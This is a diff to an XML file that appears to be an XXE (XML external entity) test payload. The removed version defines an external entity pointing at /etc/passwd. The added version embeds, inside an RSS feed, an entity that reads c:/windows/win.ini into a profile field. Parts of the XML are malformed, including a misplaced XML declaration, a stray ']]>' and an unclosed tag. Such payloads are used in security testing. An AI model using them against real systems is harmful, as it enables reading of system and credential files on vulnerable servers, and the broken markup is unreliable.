@@ -1,7 +1,27 @@
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE request [
-<!ENTITY include SYSTEM "file=/etc/passwd">
-]>
-<request>
-<description>&include;</description>
-</request>
+<rss version="2.0">
+  <channel>
+    <title>Sec</title>
+    <link>http://www.github.com</link>
+    <description>Sec XML tester</description>
+    <language>en-us</language>
+    <copyright>Copyright @ nope</copyright>
+    <pubDate/>
+    <lastBuildDate/>
+    <category>Sec</category>
+    <image>
+      <title>SecurityFocus</title>
+      <url>http://www.securityfocus.com/rss/SFLogo_v1.gif</url>
+      <link>http://www.securityfocus.com</link>
+    </image>
+    <item>
+     <?xml version="1.0" encoding="utf-8"?>
+      <!DOCTYPE updateProfile [
+        <!ENTITY file SYSTEM "file:///c:/windows/win.ini">
+        ]]>
+      <updateProfile>
+        <firstname>Joe</firstname
+        <text>&file;</text>
+      </updateProfile>
+    </item>
+  </channel>
+</rss>
